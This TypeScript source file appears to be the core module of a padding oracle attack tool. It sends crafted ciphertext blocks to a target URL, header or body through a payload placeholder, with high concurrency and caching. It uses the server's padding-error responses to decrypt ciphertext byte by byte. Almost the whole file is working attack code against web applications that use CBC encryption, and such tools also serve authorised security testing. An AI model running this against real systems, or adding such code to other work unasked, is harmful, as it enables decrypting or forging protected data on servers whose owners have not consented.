import bluebird from './bluebird' // eslint-disable-line import/order

import got from 'got'
import ow from 'ow'
import { pick, range } from 'lodash'
import cacheStore from './cache'

import { DEFAULT_USER_AGENT } from './constants'
import { logProgress, logWarning } from './logging'
import waitUntilFirstTruthyPromise from './promises'
import { HeadersObject, OracleResult, POOptions } from './types'

type AddPayload = (str?: string) => string|undefined

function getHeaders(headersArg: string | string[] | HeadersObject | undefined, addPayload: AddPayload) {
  if (!headersArg) return {}
  const headersArr = (() => {
    if (Array.isArray(headersArg)) return headersArg
    if (typeof headersArg === 'object') return Object.entries(headersArg).map(([k, v]) => `${k}: ${v}`)
    return [headersArg]
  })()
  const headers: HeadersObject = {}
  for (const _header of headersArr) {
    ow(_header, 'header', ow.string)
    const header = addPayload(_header) as string
    const index = header.indexOf(':')
    if (index < 1) throw TypeError(`Invalid header: ${header}`)
    const name = index > 0 ? header.slice(0, index).trim() : header
    headers[name] = header.slice(index + 1).trimLeft()
  }
  return headers
}

const POPAYLOAD = '{POPAYLOAD}'
const injectionRegex = new RegExp(POPAYLOAD, 'ig')

const PaddingOracle = (options: POOptions) => {
  const {
    ciphertext, plaintext, origBytes, foundBytes, interBytes, foundOffsets,
    url: _url, blockSize, blockCount, startFromFirstBlock,
    transformPayload, requestOptions = {}, concurrency = 128, isDecryptionSuccess,
    logMode = 'full', isCacheEnabled = true, initFirstPayloadBlockWithOrigBytes = false
  } = options
  ow(_url, 'url', ow.string)
  ow(blockSize, ow.number)
  ow(concurrency, ow.number)
  ow(isDecryptionSuccess, ow.function)
  if (transformPayload) ow(transformPayload, ow.function)
  ow(requestOptions, ow.object)
  ow(requestOptions.method, ow.optional.string)
  if (requestOptions.headers) ow(requestOptions.headers, ow.any(ow.object, ow.string, ow.array))
  ow(requestOptions.data, ow.optional.string)
  ow(logMode, ow.string)

  const { method, headers, data } = requestOptions
  const injectionStringPresent = !_url.includes(POPAYLOAD)
    && !String(typeof headers === 'object' ? JSON.stringify(headers) : headers).includes(POPAYLOAD)
    && !(data || '').includes(POPAYLOAD)
  const networkStats = { count: 0, lastDownloadTime: 0, bytesDown: 0, bytesUp: 0 }

  async function callOracle(payload: Buffer): Promise<{ url: string, statusCode: number, headers: HeadersObject, body: string }> {
    const payloadString = transformPayload ? transformPayload(payload) : payload.toString('hex')
    const addPayload: AddPayload = str => (str ? str.replace(injectionRegex, payloadString) : str)
    const url = (injectionStringPresent ? _url + payloadString : addPayload(_url)) as string
    const customHeaders = getHeaders(headers, addPayload)
    const body = addPayload(data)
    const cacheKey = [url, JSON.stringify(customHeaders), body].join('|')
    if (isCacheEnabled) {
      const cached = await cacheStore.get(cacheKey) as OracleResult
      if (cached) return { url, ...cached }
    }
    const response = await got(url, {
      throwHttpErrors: false,
      method,
      headers: {
        'user-agent': DEFAULT_USER_AGENT,
        ...customHeaders
      },
      body
    })
    networkStats.count++
    // @ts-ignore because `got` type definitions aren't complete
    networkStats.lastDownloadTime = response.timings.phases.total
    networkStats.bytesDown += response.socket.bytesRead || 0
    networkStats.bytesUp += response.socket.bytesWritten || 0
    const result = pick(response, ['statusCode', 'headers', 'body']) as OracleResult
    if (isCacheEnabled) await cacheStore.set(cacheKey, result)
    return { url, ...result }
  }
  function constructPayload({ byteI, blockI, byte, currentPadding }: { byteI: number, blockI: number, byte: number, currentPadding: number }) {
    const firstBlock = Buffer.alloc(blockSize)
    if (initFirstPayloadBlockWithOrigBytes) ciphertext.copy(firstBlock, 0, blockI * blockSize)
    firstBlock[byteI] = byte
    for (const i of range(byteI + 1, blockSize)) {
      const offset = (blockSize * blockI) + i
      const interByte = interBytes[offset]
      firstBlock[i] = interByte ^ currentPadding
    }
    const start = (blockI + 1) * blockSize
    const secondBlock = ciphertext.slice(start, start + blockSize)
    const twoBlocks = Buffer.concat([firstBlock, secondBlock])
    return { twoBlocks }
  }
  let badErrorArgConfidence = 0
  function byteFound({ offset, byte, origByte, currentPadding }: { offset: number, byte: number, origByte: number, currentPadding: number }) {
    if (byte === origByte) badErrorArgConfidence++
    const interByte = byte ^ currentPadding
    const foundByte = origByte ^ interByte
    foundBytes[offset] = foundByte
    interBytes[offset] = interByte
    foundOffsets.add(offset)
  }
  async function processByte(
    { blockI, byteI, byte, origByte, currentPadding, offset }:
    { blockI: number, byteI: number, byte: number, origByte: number, currentPadding: number, offset: number }
  ): Promise<boolean> {
    const { twoBlocks } = constructPayload({ blockI, byteI, byte, currentPadding })

    if (foundOffsets.has(offset)) return true

    const req = await callOracle(twoBlocks)
    const decryptionSuccess = isDecryptionSuccess(req)

    if (decryptionSuccess) byteFound({ offset, byte, origByte, currentPadding })

    if (logMode === 'full') {
      if (!(foundOffsets.has(offset) && !decryptionSuccess)) { // make sure concurrency doesn't cause former bytes progress to be logged after later byte
        logProgress({ ciphertext, plaintext, foundOffsets, blockSize, blockI, byteI, byte, decryptionSuccess, networkStats, startFromFirstBlock })
      }
    }

    return decryptionSuccess
  }
  async function processBlock(blockI: number) {
    for (const byteI of range(blockSize - 1, -1)) {
      const currentPadding = blockSize - byteI
      const offset = (blockSize * blockI) + byteI
      const origByte = origBytes[offset] // plaintext or ciphertext
      if (foundOffsets.has(offset)) continue
      const byteRange: number[] = range(0, 256)
      if (concurrency > 1) {
        const promises = byteRange.map(byte => bluebird.method(() => processByte({ blockI, byteI, byte, origByte, currentPadding, offset })))
        await waitUntilFirstTruthyPromise(promises, { concurrency })
      } else {
        for (const byte of byteRange) {
          const success = await processByte({ blockI, byteI, byte, origByte, currentPadding, offset })
          if (success) break
        }
      }
      if (!foundOffsets.has(offset)) throw Error(`Padding oracle failure for offset: 0x${offset.toString(16)}. Try again or check the parameter you provided for determining decryption success.`)
    }
    if (badErrorArgConfidence > (blockSize / 2)) {
      logWarning('The parameter you provided for determining decryption success seems to be incorrect.')
      badErrorArgConfidence = 0
    }
  }
  async function processBlocks() {
    const blockIndexes = startFromFirstBlock ? range(blockCount - 1) : range(blockCount - 2, -1)
    for (const blockI of blockIndexes) {
      await processBlock(blockI)
    }
  }
  return { processBlocks, callOracle }
}

export default PaddingOracle
